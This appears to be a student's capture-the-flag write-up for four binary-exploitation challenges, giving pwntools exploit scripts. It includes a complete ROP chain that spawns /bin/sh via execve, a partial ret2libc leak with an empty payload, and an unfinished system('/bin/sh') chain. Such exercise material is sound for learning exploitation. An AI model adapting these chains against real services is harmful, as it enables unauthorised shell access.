CHONK
===========================

General overview of problems faced
-------------------------------------
Had trouble clearing out rdx and also took a very very long time to locate a gadget that could move rax into rdi register because `ropr` is useless :(

Script/Command used
------------------
```python

POP_RAX = p64(0x004213eb)
POP_RDI = p64(0x0047e852)
POP_RSI = p64(0x0047d04b)
JUNK = p64(0x0)
SYSCALL = p64(0x0040b9f6) # syscall; ret;
MOV_RDI_RAX = p64(0x00404bd6) # mov rdi, rax; cmp rdx, rcx; jae 0x4bc0; mov rax, rsi; ret; 

def exploit():
    offset = 8 # found using cyclic
    rop_chain = b"/bin/sh\x00"            # "/bin/sh" string in rax
    rop_chain += b"A" * offset
    rop_chain += POP_RSI                  # pop rsi; ret;
    rop_chain += JUNK                     # Address with 0 value in memory
    rop_chain += MOV_RDI_RAX
    rop_chain += POP_RAX                  # pop rax; ret;
    rop_chain += p64(0x3b)                # rax = 0x3b (execve syscall)
    rop_chain += SYSCALL

    P.sendlineafter(b"most...\n", rop_chain)

    P.interactive()

```

RET2LIBC
===========================

General overview of problems faced
-------------------------------------
Had to work out which version of libc was being used on the remote server and construct payload using offset but ran out of time.

Script/Command used
------------------
```python
def exploit():
    P.recvuntil(b'- ',drop=True)
    setbuf_leak = P.recvline()
    setbuf_leak = setbuf_leak[:-3]
    setbuf_leak = int(setbuf_leak, 16)
    log.info(f"setbuf is at: {hex(setbuf_leak)}")
    P.recvline()

    setbuf_offset = LIBC.symbols["setbuf"]
    LIBC.address = setbuf_leak - setbuf_offset
    log.info(f"base libc address: {hex(LIBC.address)}")
    libc_system = LIBC.symbols["system"]
    libc_binsh = next(LIBC.search(b'/bin/sh\00'))
    return_addr_junk = p64(0)

    payload = b""
    
    P.sendline(payload)
    P.interactive()

```

SWROP
===========================

General overview of problems faced
-------------------------------------
Brief attempt at solving this problem but again, ran out of time to complete.

Script/Command used
------------------
```python
def exploit():
    system_target = E.symbols["system"]
    binsh_target = next(E.search(b"/bin/sh\00"))
    offset = cyclic_find(0x6261616b6261616a)
    payload = fit({
        offset: system_target,
        offset + 8: p64(0),
        offset + 16: p64(binsh_target)
    })
    P.sendline(payload)
    P.interactive()
```

ROPORSHELLCODE
===========================

General overview of problems faced
-------------------------------------
Ran out of time to complete.


